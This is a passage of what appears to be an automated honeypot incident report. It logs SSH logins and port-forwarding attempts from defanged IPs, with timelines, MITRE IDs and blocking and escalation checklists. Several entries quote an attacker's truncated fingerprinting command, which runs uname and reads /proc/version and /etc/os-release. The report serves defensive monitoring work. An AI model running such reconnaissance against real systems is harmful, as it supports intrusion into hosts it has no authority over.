| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:52:26` | `cowrie.session.connect` |
| `2026-08-21 17:52:27` | `cowrie.client.version` |
| `2026-08-21 17:52:27` | `cowrie.client.kex` |
| `2026-08-21 17:52:28` | `cowrie.login.success` |
| `2026-08-21 17:52:29` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:52:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `181.212.174[.]166` to AbuseIPDB if not already reported
- [ ] Block `181.212.174[.]166` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d2f394e0ef37

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:53 |
| **Last Seen** | 2026-08-21 17:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:53:35` | `cowrie.session.connect` |
| `2026-08-21 17:53:35` | `cowrie.client.version` |
| `2026-08-21 17:53:35` | `cowrie.client.kex` |
| `2026-08-21 17:53:36` | `cowrie.login.success` |
| `2026-08-21 17:53:37` | `cowrie.session.params` |
| `2026-08-21 17:53:37` | `cowrie.command.input` |
| `2026-08-21 17:53:37` | `cowrie.command.input` |
| `2026-08-21 17:53:37` | `cowrie.command.input` |
| `2026-08-21 17:53:37` | `cowrie.command.input` |
| `2026-08-21 17:53:37` | `cowrie.command.input` |
| `2026-08-21 17:53:37` | `cowrie.command.success` |
| `2026-08-21 17:53:37` | `cowrie.command.input` |
| `2026-08-21 17:53:37` | `cowrie.command.input` |
| `2026-08-21 17:53:37` | `cowrie.command.input` |
| `2026-08-21 17:53:37` | `cowrie.command.input` |
| `2026-08-21 17:53:38` | `cowrie.log.closed` |
| `2026-08-21 17:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-11bb34fd8655

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:56 |
| **Last Seen** | 2026-08-21 17:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:56:05` | `cowrie.session.connect` |
| `2026-08-21 17:56:05` | `cowrie.client.version` |
| `2026-08-21 17:56:05` | `cowrie.client.kex` |
| `2026-08-21 17:56:08` | `cowrie.login.success` |
| `2026-08-21 17:56:08` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:56:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:56:15` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:56:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9aea25f9b0b6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 17:56 |
| **Last Seen** | 2026-08-21 17:56 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:56:10` | `cowrie.session.connect` |
| `2026-08-21 17:56:10` | `cowrie.client.version` |
| `2026-08-21 17:56:10` | `cowrie.client.kex` |
| `2026-08-21 17:56:17` | `cowrie.login.success` |
| `2026-08-21 17:56:17` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:56:17` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 17:56:17` | `cowrie.direct-tcpip.data` |
| `2026-08-21 17:56:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-10479421ed18

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:56 |
| **Last Seen** | 2026-08-21 17:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:56:41` | `cowrie.session.connect` |
| `2026-08-21 17:56:41` | `cowrie.client.version` |
| `2026-08-21 17:56:41` | `cowrie.client.kex` |
| `2026-08-21 17:56:41` | `cowrie.login.success` |
| `2026-08-21 17:56:42` | `cowrie.session.params` |
| `2026-08-21 17:56:42` | `cowrie.command.input` |
| `2026-08-21 17:56:42` | `cowrie.command.input` |
| `2026-08-21 17:56:42` | `cowrie.command.input` |
| `2026-08-21 17:56:42` | `cowrie.command.input` |
| `2026-08-21 17:56:42` | `cowrie.command.input` |
| `2026-08-21 17:56:42` | `cowrie.command.success` |
| `2026-08-21 17:56:42` | `cowrie.command.input` |
| `2026-08-21 17:56:42` | `cowrie.command.input` |
| `2026-08-21 17:56:42` | `cowrie.command.input` |
| `2026-08-21 17:56:42` | `cowrie.command.input` |
| `2026-08-21 17:56:43` | `cowrie.log.closed` |
| `2026-08-21 17:56:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4da49275c0a6

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-21 17:59 |
| **Last Seen** | 2026-08-21 17:59 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:59:22` | `cowrie.session.connect` |
| `2026-08-21 17:59:23` | `cowrie.client.version` |
| `2026-08-21 17:59:23` | `cowrie.client.kex` |
| `2026-08-21 17:59:23` | `cowrie.login.success` |
| `2026-08-21 17:59:25` | `cowrie.session.params` |
| `2026-08-21 17:59:25` | `cowrie.command.input` |
| `2026-08-21 17:59:25` | `cowrie.command.input` |
| `2026-08-21 17:59:25` | `cowrie.command.input` |
| `2026-08-21 17:59:25` | `cowrie.command.input` |
| `2026-08-21 17:59:25` | `cowrie.command.input` |
| `2026-08-21 17:59:25` | `cowrie.command.success` |
| `2026-08-21 17:59:25` | `cowrie.command.input` |
| `2026-08-21 17:59:25` | `cowrie.command.input` |
| `2026-08-21 17:59:25` | `cowrie.command.input` |
| `2026-08-21 17:59:25` | `cowrie.command.input` |
| `2026-08-21 17:59:25` | `cowrie.log.closed` |
| `2026-08-21 17:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-168f613f91a6

| Field | Detail |
|---|---|
| **Source IP** | `93.241.232[.]14` |
| **First Seen** | 2026-08-21 17:59 |
| **Last Seen** | 2026-08-21 17:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:59:26` | `cowrie.session.connect` |
| `2026-08-21 17:59:26` | `cowrie.client.version` |
| `2026-08-21 17:59:26` | `cowrie.client.kex` |
| `2026-08-21 17:59:27` | `cowrie.login.success` |
| `2026-08-21 17:59:28` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.241.232[.]14` to AbuseIPDB if not already reported
- [ ] Block `93.241.232[.]14` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc3a89983669

| Field | Detail |
|---|---|
| **Source IP** | `49.124.147[.]96` |
| **First Seen** | 2026-08-21 17:59 |
| **Last Seen** | 2026-08-21 17:59 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 17:59:33` | `cowrie.session.connect` |
| `2026-08-21 17:59:34` | `cowrie.client.version` |
| `2026-08-21 17:59:34` | `cowrie.client.kex` |
| `2026-08-21 17:59:36` | `cowrie.login.success` |
| `2026-08-21 17:59:36` | `cowrie.direct-tcpip.request` |
| `2026-08-21 17:59:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.147[.]96` to AbuseIPDB if not already reported
- [ ] Block `49.124.147[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6153ae5792b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:07 |
| **Last Seen** | 2026-08-21 18:08 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:07:28` | `cowrie.session.connect` |
| `2026-08-21 18:07:28` | `cowrie.client.version` |
| `2026-08-21 18:07:28` | `cowrie.client.kex` |
| `2026-08-21 18:07:31` | `cowrie.login.success` |
| `2026-08-21 18:08:24` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:08:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-62a1eea4af7c

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:07 |
| **Last Seen** | 2026-08-21 18:07 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:07:33` | `cowrie.session.connect` |
| `2026-08-21 18:07:33` | `cowrie.client.version` |
| `2026-08-21 18:07:34` | `cowrie.client.kex` |
| `2026-08-21 18:07:37` | `cowrie.login.success` |
| `2026-08-21 18:07:39` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:07:46` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 18:07:46` | `cowrie.direct-tcpip.data` |
| `2026-08-21 18:07:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbde9274af77

| Field | Detail |
|---|---|
| **Source IP** | `170.247.3[.]15` |
| **First Seen** | 2026-08-21 18:15 |
| **Last Seen** | 2026-08-21 18:15 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:15:01` | `cowrie.session.connect` |
| `2026-08-21 18:15:02` | `cowrie.client.version` |
| `2026-08-21 18:15:02` | `cowrie.client.kex` |
| `2026-08-21 18:15:03` | `cowrie.login.success` |
| `2026-08-21 18:15:04` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:15:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `170.247.3[.]15` to AbuseIPDB if not already reported
- [ ] Block `170.247.3[.]15` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ada5ca5fe5dd

| Field | Detail |
|---|---|
| **Source IP** | `220.122.115[.]9` |
| **First Seen** | 2026-08-21 18:15 |
| **Last Seen** | 2026-08-21 18:15 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:15:09` | `cowrie.session.connect` |
| `2026-08-21 18:15:09` | `cowrie.client.version` |
| `2026-08-21 18:15:09` | `cowrie.client.kex` |
| `2026-08-21 18:15:11` | `cowrie.login.success` |
| `2026-08-21 18:15:12` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:15:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.122.115[.]9` to AbuseIPDB if not already reported
- [ ] Block `220.122.115[.]9` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d48d0193dee

| Field | Detail |
|---|---|
| **Source IP** | `180.71.9[.]31` |
| **First Seen** | 2026-08-21 18:16 |
| **Last Seen** | 2026-08-21 18:16 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:16:04` | `cowrie.session.connect` |
| `2026-08-21 18:16:05` | `cowrie.client.version` |
| `2026-08-21 18:16:05` | `cowrie.client.kex` |
| `2026-08-21 18:16:07` | `cowrie.login.success` |
| `2026-08-21 18:16:08` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:16:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.71.9[.]31` to AbuseIPDB if not already reported
- [ ] Block `180.71.9[.]31` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f95dcba245

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:19 |
| **Last Seen** | 2026-08-21 18:20 |
| **Session Duration** | 56s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:19:18` | `cowrie.session.connect` |
| `2026-08-21 18:19:18` | `cowrie.client.version` |
| `2026-08-21 18:19:19` | `cowrie.client.kex` |
| `2026-08-21 18:19:22` | `cowrie.login.success` |
| `2026-08-21 18:19:24` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:20:15` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 18:20:15` | `cowrie.direct-tcpip.data` |
| `2026-08-21 18:20:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3368c872df8b

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:19 |
| **Last Seen** | 2026-08-21 18:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:19:24` | `cowrie.session.connect` |
| `2026-08-21 18:19:25` | `cowrie.client.version` |
| `2026-08-21 18:19:25` | `cowrie.client.kex` |
| `2026-08-21 18:19:26` | `cowrie.login.success` |
| `2026-08-21 18:19:26` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:19:26` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 18:19:26` | `cowrie.direct-tcpip.data` |
| `2026-08-21 18:19:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c02753222ab5

| Field | Detail |
|---|---|
| **Source IP** | `196.0.41[.]134` |
| **First Seen** | 2026-08-21 18:21 |
| **Last Seen** | 2026-08-21 18:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:21:08` | `cowrie.session.connect` |
| `2026-08-21 18:21:10` | `cowrie.client.version` |
| `2026-08-21 18:21:10` | `cowrie.client.kex` |
| `2026-08-21 18:21:12` | `cowrie.login.success` |
| `2026-08-21 18:21:13` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:21:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.0.41[.]134` to AbuseIPDB if not already reported
- [ ] Block `196.0.41[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-adaa132f02d4

| Field | Detail |
|---|---|
| **Source IP** | `106.245.246[.]26` |
| **First Seen** | 2026-08-21 18:21 |
| **Last Seen** | 2026-08-21 18:21 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:21:20` | `cowrie.session.connect` |
| `2026-08-21 18:21:21` | `cowrie.client.version` |
| `2026-08-21 18:21:21` | `cowrie.client.kex` |
| `2026-08-21 18:21:24` | `cowrie.login.success` |
| `2026-08-21 18:21:25` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `106.245.246[.]26` to AbuseIPDB if not already reported
- [ ] Block `106.245.246[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6ae4eeb79963

| Field | Detail |
|---|---|
| **Source IP** | `61.240.29[.]222` |
| **First Seen** | 2026-08-21 18:24 |
| **Last Seen** | 2026-08-21 18:25 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:24:15` | `cowrie.session.connect` |
| `2026-08-21 18:24:15` | `cowrie.client.version` |
| `2026-08-21 18:24:15` | `cowrie.client.kex` |
| `2026-08-21 18:25:01` | `cowrie.login.success` |
| `2026-08-21 18:25:02` | `cowrie.session.params` |
| `2026-08-21 18:25:02` | `cowrie.command.input` |
| `2026-08-21 18:25:02` | `cowrie.log.closed` |
| `2026-08-21 18:25:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.240.29[.]222` to AbuseIPDB if not already reported
- [ ] Block `61.240.29[.]222` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c39f1c358966

| Field | Detail |
|---|---|
| **Source IP** | `103.158.138[.]179` |
| **First Seen** | 2026-08-21 18:24 |
| **Last Seen** | 2026-08-21 18:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:24:41` | `cowrie.session.connect` |
| `2026-08-21 18:24:42` | `cowrie.client.version` |
| `2026-08-21 18:24:42` | `cowrie.client.kex` |
| `2026-08-21 18:24:44` | `cowrie.login.success` |
| `2026-08-21 18:24:44` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:24:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.158.138[.]179` to AbuseIPDB if not already reported
- [ ] Block `103.158.138[.]179` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9f425bf25ec6

| Field | Detail |
|---|---|
| **Source IP** | `1.212.225[.]99` |
| **First Seen** | 2026-08-21 18:24 |
| **Last Seen** | 2026-08-21 18:25 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:24:57` | `cowrie.session.connect` |
| `2026-08-21 18:24:58` | `cowrie.client.version` |
| `2026-08-21 18:24:58` | `cowrie.client.kex` |
| `2026-08-21 18:25:00` | `cowrie.login.success` |
| `2026-08-21 18:25:01` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:25:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.212.225[.]99` to AbuseIPDB if not already reported
- [ ] Block `1.212.225[.]99` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-02d8858a5a8f

| Field | Detail |
|---|---|
| **Source IP** | `1.233.103[.]18` |
| **First Seen** | 2026-08-21 18:25 |
| **Last Seen** | 2026-08-21 18:25 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:25:06` | `cowrie.session.connect` |
| `2026-08-21 18:25:07` | `cowrie.client.version` |
| `2026-08-21 18:25:07` | `cowrie.client.kex` |
| `2026-08-21 18:25:09` | `cowrie.login.success` |
| `2026-08-21 18:25:10` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:25:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `1.233.103[.]18` to AbuseIPDB if not already reported
- [ ] Block `1.233.103[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ca20d4d0fb9d

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-21 18:30 |
| **Last Seen** | 2026-08-21 18:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-21 18:30:55` | `cowrie.session.connect` |
| `2026-08-21 18:30:55` | `cowrie.client.version` |
| `2026-08-21 18:30:55` | `cowrie.client.kex` |
| `2026-08-21 18:30:56` | `cowrie.login.success` |
| `2026-08-21 18:30:56` | `cowrie.direct-tcpip.request` |
| `2026-08-21 18:30:56` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-21 18:30:56` | `cowrie.direct-tcpip.data` |
